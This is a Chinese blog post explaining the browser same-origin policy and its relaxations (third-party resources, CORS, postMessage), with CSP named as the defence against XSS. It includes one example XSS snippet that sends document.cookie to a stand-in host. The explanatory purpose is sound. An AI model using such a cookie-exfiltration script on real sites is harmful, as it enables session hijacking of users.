---
title: 浏览器为何限制跨域访问？
categories:
 - Network
tags:
 - 浏览器安全
 - 跨域
 - 同源策略
 - Same Origin Policy
date: 2022-10-09
sidebar: 'auto'
---

## 前言
假如页面没有安全策略：
* Web是开放的，任何资源可以介入，自己网站可以加载并执行他人网站的脚本文件、图片、音视频等资源，甚至下载其他站点的可执行文件。
* 页面上行为没有任何限制造成无序混沌的局面、不可控。

打开一个银行站点，又打开一个恶意站点，恶意站点将可以做很多事情：
* 修改银行站点的DOM、CSSOM等信息；
* 在银行站点内部插入JavaScript脚本；
* 劫持用户登录的用户名和密码；
* 读取银行站点的Cookie、IndexDB等数据；
* 将信息上传至自己的服务器，伪造转账请求；

**没有安全策略的Web，我们是没有隐私的，所以需要安全策略来保障隐私和数据的安全。**<br/>
:::tip
页面中最基础、最核心的安全策略：同源策略（Same-origin policy）。
::: 

## 同源策略
两个URL => 协议（http）、域名（mobs.fun）、端口（80）相同 => URL同源。<br/>
浏览器默认同源之间可以**相互访问资源和操作DOM**，不同源之间若想要相互访问资源或者操作DOM，会有**一套基础的安全策略的制约**（同源策略）。<br/>
同源策略三个层面：
1. DOM层面 => 同源策略限制了不同源的JavaScript脚本对当前站点DOM对象读和写的操作。
2. 数据层面 => 同源策略限制了不同源的站点读取当前站点的Cookie、IndexDB、LocalStorage等数据。无法通过第二个页面的[opener](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/opener)来访问第一个页面中的Cookie、IndexDB、LocalStorage等数据。
3. 网络层面 => 同源策略限制了通过[XMLHttpRequest](../javascript/XMLHttpRequest.html)等方式将站点的数据发送给不同源的站点。

## 安全性和便利性的权衡
同源策略隔离了不同源的DOM、数据、网络通信，实现Web页面的安全性。<br/>
但是安全性和便利性是相互对立的，不同的源之间绝对隔离，可以说是最安全的措施，但这会让Web项目变得难以开发和使用。所以需要做出权衡，**出让一些安全性来满足灵活性。**<br/>
浏览器出让的同源策略的安全性有哪些：
1. 页面中可以嵌入第三方资源
2. 跨域资源共享
3. 跨文档消息机制

### 页面中可以嵌入第三方资源
同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有HTML文件、JavaScript文件、CSS文件、图片等资源都部署在同一台服务器上。这其实违背了Web的初衷，也带来了很多限制。<br/>
比如我们需要引用不同CDN上的资源，域名其实是不同的，我们是需要同源策略支持页面任意引用外部文件，所以最初的浏览器都是支持引用外部资源文件的。<br/>
**带来的弊端：**
* HTML文件注入恶意JavaScript脚本
* XSS攻击。
```js
function onClick(){
 // 恶意脚本读取Cookie数据，并将其作为参数添加至恶意站点尾部。
 // 当打开该恶意页面时，恶意服务器就能接收到当前用户的Cookie信息。
 let url = `http://test.com?cookie=${document.cookie}`
 open(url)
}
onClick()
```
解决XSS攻击，浏览器中引入了[内容安全策略](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)（CSP），CSP的核心思想是**让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联JavaScript代码**。

### 跨域资源共享
一般情况，通过XMLHttpRequest or Fetch来请求其他站点的资源，同源策略会阻止向其发出请求。<br/>
为了解决这个问题，引入了[跨域资源共享](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS)（CORS），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。
### 跨文档消息机制
同源策略下，如果两个页面不同源的，则无法相互操纵DOM。实际情况下，经常需要两个不同源的DOM之间进行通信，所以浏览器中又引入了跨文档消息机制，可以通过
JavaScript接口[window.postMessage](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage)来进行不同源的DOM通信。

## 总结
* 同源策略隔离不同源的DOM、数据、网络通信，实现Web页面的安全性。<br/>

目前在安全性和便利性权衡下的安全策略特点：
1. 页面可以引用第三方资源 => 暴露了很多安全问题（XSS攻击）=> 在此基础上引入了CSP来限制其自由程度。 
2. 使用XMLHttpRequest和Fetch是无法直接进行跨域请求的 => 浏览器在其基础上引入了**跨域资源共享策略**，让其安全地进行跨域操作。
3. 两个不同源的DOM不能相互操纵 => 浏览器中实现了**跨文档消息机制**让其安全地通信